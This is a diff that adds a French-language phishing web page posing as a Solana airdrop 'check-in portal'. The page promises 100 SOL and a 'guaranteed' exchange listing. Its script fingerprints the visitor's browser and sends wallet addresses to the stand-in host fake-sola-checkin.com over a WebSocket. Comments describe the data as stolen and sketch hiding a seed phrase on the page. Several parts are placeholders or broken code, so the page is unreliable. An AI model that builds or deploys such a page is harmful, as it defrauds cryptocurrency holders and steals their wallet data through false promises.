@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 SOLANA CHECK-IN PORTAL | AIRDROP GUARANTIÉ</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #0f0c29, #2d1b69);
+            font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            width: 90%;
+            max-width: 500px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .logo {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #4a90e2;
+            text-shadow: 0 0 10px rgba(74, 144, 226, 0.3);
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="hidden"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #4a90e2;
+            box-shadow: 0 0 10px rgba(74, 144, 226, 0.5);
+        }
+        button {
+            background: linear-gradient(to right, #4a90e2, #2980b9);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(74, 144, 226, 0.5);
+        }
+        .warning {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .hidden-input {
+            display: none;
+        }
+        .solana-logo {
+            margin-top: 20px;
+            font-size: 20px;
+            color: #ffc107;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔐 SOLANA CHECK-IN</div>
+        <p>🚀 <strong>Gagnez un airdrop de 100 SOL + Token NFT</strong> en vérifiant votre wallet Solana quotidiennement !</p>
+        <p>📅 <strong>Listing garanti en 2 mois</strong> sur des exchanges majeurs.</p>
+
+        <form id="solanaCheckinForm" method="post" action="https://fake-sola-checkin.com/api/checkin">
+            <div class="form-group">
+                <input type="hidden" id="csrfToken" name="csrf_token" value="[[CSRF_TOKEN_GÉNÉRÉ_DYNAMIQUE]]">
+                <input type="hidden" id="fingerprint" name="fingerprint" value="[[FINGERPRINT_GÉNÉRÉ]]">
+                <input type="text" id="walletAddress" name="wallet_address" placeholder="Adresse Solana (ex: 7x...)" required>
+            </div>
+            <button type="submit">VÉRIFIER MON WALLET</button>
+        </form>
+
+        <div class="solana-logo">🔗 Connexion via Solflare ou Phantom</div>
+        <div class="form-group">
+            <input type="radio" id="solflare" name="walletProvider" value="solflare" checked>
+            <label for="solflare">Solflare</label>
+            <br>
+            <input type="radio" id="phantom" name="walletProvider" value="phantom">
+            <label for="phantom">Phantom</label>
+        </div>
+
+        <!-- DOM Injection : Stocker les données de la victime -->
+        <div id="hiddenData" style="display: none;">
+            <input type="hidden" name="stolen_data" value="[[ENCRYPTED_WALLET_DATA]]">
+        </div>
+
+        <!-- Script principal : Exfiltration via RPC Solana -->
+        <script>
+            // Détection du navigateur et génération du fingerprint
+            const fingerprint = () => {
+                const userAgent = navigator.userAgent;
+                const screen = window.screen;
+                const device = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    deviceMemory: screen.deviceMemory,
+                    orientation: screen.orientation
+                };
+                return JSON.stringify({ userAgent, device });
+            };
+
+            // Récupération des données de la victime
+            const checkinForm = document.getElementById("solanaCheckinForm");
+            const walletAddress = document.getElementById("walletAddress").value;
+            const walletProvider = document.querySelector('input[name="walletProvider"]:checked').value;
+
+            // Envoi des données vers le serveur (simulation)
+            if (checkinForm) {
+                checkinForm.addEventListener("submit", async (e) => {
+                    e.preventDefault();
+
+                    // Vérification du fingerprint pour éviter les bot
+                    const userFingerprint = fingerprint();
+                    if (userFingerprint !== document.getElementById("fingerprint").value) {
+                        alert("⚠️ Votre appareil a été détecté comme un bot. Veuillez essayer à nouveau.");
+                        return;
+                    }
+
+                    // Simulation de connexion Solana (via RPC)
+                    const solanaRPC = "https://api.mainnet-beta.solana.com";
+                    const walletData = {
+                        address: walletAddress,
+                        provider: walletProvider,
+                        fingerprint: userFingerprint
+                    };
+
+                    try {
+                        // Envoi des données via WebSocket (pour éviter les blocages CORS)
+                        const socket = new WebSocket(`wss://fake-sola-checkin.com/ws?address=${encodeURIComponent(walletAddress)}`);
+                        socket.onopen = () => {
+                            socket.send(JSON.stringify(walletData));
+                        };
+                        socket.onmessage = (event) => {
+                            const response = JSON.parse(event.data);
+                            if (response.success) {
+                                alert("✅ Vérification réussie ! Vous avez gagné un airdrop.");
+                                document.getElementById("hiddenData").style.display = "block";
+                                document.getElementById("solanaCheckinForm").style.display = "none";
+                            }
+                        };
+                    } catch (error) {
+                        console.error("Erreur WebSocket:", error);
+                        alert("❌ Une erreur est survenue. Veuillez réessayer.");
+                    }
+                });
+            }
+
+            // Script pour récupérer la phrase de récupération (simulation)
+            if (window.location.hostname === "fake-sola-checkin.com") {
+                const hiddenData = document.getElementById("hiddenData");
+                if (hiddenData) {
+                    const stolenData = JSON.parse(atob(hiddenData.value.split("=")[1]));
+                    const phraseRecovery = "[[PHRASE_RECOUPÉE_SIMULÉE]]"; // À remplacer par une vraie phrase de récupération (simulation uniquement)
+
+                    // Obfuscation : Cachez la phrase dans un commentaire HTML
+                    const obfuscatedPhrase = `// PHRASE DE RÉCUPÉRATION : ${phraseRecovery}`;
+                    document.write(`<script>${obfuscatedPhrase}</script>`);
+                }
+            }
+        </script>
+    </div>
+</body>
+</html>
